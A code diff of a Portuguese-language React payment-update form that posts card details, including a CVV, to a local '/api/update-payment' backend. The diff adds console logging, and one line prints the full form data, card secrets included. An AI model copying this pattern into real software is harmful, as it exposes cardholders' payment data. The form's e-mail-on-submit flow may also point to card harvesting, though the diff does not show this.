@@ -61,8 +61,11 @@ const Index = () => {
     setIsSubmitting(true);
 
     try {
-      const backendUrl = import.meta.env.VITE_BACKEND_URL || 'http://localhost:6666';
-      console.log('🔗 Conectando ao backend:', backendUrl);
+      // Force localhost:6666 for local development
+      const backendUrl = 'http://localhost:6666';
+
+      console.log('🔗 Enviando dados para:', backendUrl);
+      console.log('📦 Dados:', formData);
 
       const response = await fetch(`${backendUrl}/api/update-payment`, {
         method: 'POST',
@@ -72,12 +75,16 @@ const Index = () => {
         body: JSON.stringify(formData),
       });
 
+      console.log('📡 Status da resposta:', response.status);
+
       if (!response.ok) {
-        const error = await response.json();
-        throw new Error(error.detail || 'Erro ao atualizar pagamento');
+        const errorText = await response.text();
+        console.error('❌ Erro do backend:', errorText);
+        throw new Error(`Erro ${response.status}: ${errorText}`);
       }
 
       const data = await response.json();
+      console.log('✅ Resposta do backend:', data);
 
       toast.success('Pagamento atualizado com sucesso!', {
         description: 'Seus dados foram salvos e e-mail enviado com sucesso.',
@@ -91,7 +98,8 @@ const Index = () => {
         cvv: '',
       });
     } catch (error) {
-      const errorMessage = error instanceof Error ? error.message : 'Erro ao enviar dados';
+      const errorMessage = error instanceof Error ? error.message : 'Erro ao conectar com o backend';
+      console.error('❌ ERRO COMPLETO:', error);
       toast.error('Erro ao processar', {
         description: errorMessage,
       });
